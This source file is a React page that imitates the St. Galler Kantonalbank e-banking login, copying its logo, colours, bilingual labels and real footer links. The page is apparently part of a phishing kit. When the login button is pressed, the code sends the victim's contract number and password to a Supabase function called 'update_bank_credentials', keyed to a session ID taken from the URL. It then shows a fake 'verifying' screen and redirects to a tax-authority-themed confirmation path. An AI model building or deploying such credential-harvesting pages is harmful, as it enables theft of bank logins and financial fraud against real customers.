import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ArrowRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/st-galler-kantonalbank-logo.svg.asset.json";

const GREEN = "#008751";

type Lang = "de" | "en";

const translations: Record<Lang, {
  pageTitle: string;
  loginTitle: string;
  contractNumber: string;
  password: string;
  submit: string;
  loading: string;
  forgot: string;
  block: string;
  required: string;
}> = {
  de: {
    pageTitle: "St. Galler Kantonalbank – E-Banking",
    loginTitle: "Login SGKB E-Banking",
    contractNumber: "Vertragsnummer",
    password: "Passwort",
    submit: "Login",
    loading: "Anmeldedaten werden überprüft...",
    forgot: "Login-Daten vergessen",
    block: "Vertrag sperren",
    required: "Das Feld darf nicht leer sein.",
  },
  en: {
    pageTitle: "St. Galler Kantonalbank – E-banking",
    loginTitle: "Login SGKB E-banking",
    contractNumber: "Contract number",
    password: "Password",
    submit: "Login",
    loading: "Verifying login details...",
    forgot: "Forgot login details",
    block: "Block contract",
    required: "This field must not be empty.",
  },
};

const footerLinks = [
  { de: "Sicherheit", en: "Security", href: "https://www.sgkb.ch/de/e-banking/sicherheit" },
  { de: "Rechtliche Hinweise", en: "Legal notice", href: "https://www.sgkb.ch/de/e-banking/rechtliches" },
  { de: "Hilfe/Support", en: "Help/Support", href: "https://www.sgkb.ch/de/e-banking/hilfe" },
  { de: "Kontakt", en: "Contact", href: "https://www.sgkb.ch/de/e-banking/supportanfrage" },
];

const ChStGallerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [touchedVnr, setTouchedVnr] = useState(false);
  const [touchedPw, setTouchedPw] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  const t = translations[lang];
  usePageMeta(t.pageTitle, logoAsset.url);

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const handleSubmit = async () => {
    if (!canSubmit) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputClass =
    "w-full h-[48px] px-3 bg-white border border-[#6c6e70] rounded-none text-[18px] " +
    "outline-none focus:outline focus:outline-1 focus:outline-offset-[2px] focus:outline-[#6c6e70]";

  const showVnrError = touchedVnr && vertragsnummer.trim() === "";
  const showPwError = touchedPw && passwort.trim() === "";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-white flex flex-col">
        {/* Header */}
        <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 pt-6 md:pt-10">
          <div className="flex items-start justify-between">
            <img src={logoAsset.url} alt="St. Galler Kantonalbank" className="h-[38px] md:h-[48px] object-contain" />
            <div className="flex items-center gap-3 text-[14px] text-[#3a3a3a] pt-2">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "font-bold" : "font-normal underline"}
              >
                DE
              </button>
              <span className="text-[#bcbcbc]">|</span>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "font-bold" : "font-normal underline"}
              >
                EN
              </button>
            </div>
          </div>
        </div>

        {/* Content area — vertically centered on mobile */}
        <div className="flex-1 flex items-center md:block">
          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20">
            {/* Headline */}
            <h1
              className="mt-0 md:mt-10 text-[24px] md:text-[28px] font-normal"
              style={{ color: GREEN }}
            >
              {t.loginTitle}
            </h1>

            {/* Form */}
            <div className="mt-8 max-w-[480px]">
              <div className="space-y-5">
                <div>
                  <label htmlFor="sgkb-vnr" className="block text-[14px] text-black font-bold mb-2">
                    {t.contractNumber}
                  </label>
                  <input
                    id="sgkb-vnr"
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    onBlur={() => setTouchedVnr(true)}
                    className={inputClass}
                  />
                  {showVnrError && (
                    <p className="mt-2 text-[13px] font-normal text-[#d32f2f]">{t.required}</p>
                  )}
                </div>
                <div>
                  <label htmlFor="sgkb-pw" className="block text-[14px] text-black font-bold mb-2">
                    {t.password}
                  </label>
                  <input
                    id="sgkb-pw"
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    onBlur={() => setTouchedPw(true)}
                    className={inputClass}
                  />
                  {showPwError && (
                    <p className="mt-2 text-[13px] font-normal text-[#d32f2f]">{t.required}</p>
                  )}
                </div>
              </div>

              <div className="mt-8">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className={
                    "px-10 h-[44px] rounded-none text-[15px] font-medium transition-colors " +
                    (canSubmit
                      ? "bg-[#008751] text-white cursor-pointer hover:bg-[#007046]"
                      : "bg-[#dedfdf] text-[#9a9a9a] cursor-not-allowed")
                  }
                >
                  {t.submit}
                </button>
              </div>

              <div className="mt-8 space-y-3">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="flex items-center gap-2 text-[15px] underline"
                  style={{ color: GREEN }}
                >
                  <ArrowRight size={18} strokeWidth={2} />
                  {t.forgot}
                </a>
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="flex items-center gap-2 text-[15px] underline"
                  style={{ color: GREEN }}
                >
                  <ArrowRight size={18} strokeWidth={2} />
                  {t.block}
                </a>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="mt-16 py-6">
          <div className="max-w-[1100px] mx-auto px-4 md:px-20">
            <div className="flex flex-nowrap items-center gap-x-1.5 md:gap-x-2 gap-y-2 text-[11px] md:text-[15px]" style={{ color: "#6c6e70" }}>
              {footerLinks.map((link, i) => (
                <div key={link.href} className="flex items-center gap-x-1.5 md:gap-x-2">
                  <a
                    href={link.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline"
                  >
                    {lang === "de" ? link.de : link.en}
                  </a>
                  {i < footerLinks.length - 1 && <span className="text-[#bcbcbc]">|</span>}
                </div>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChStGallerKantonalbank;
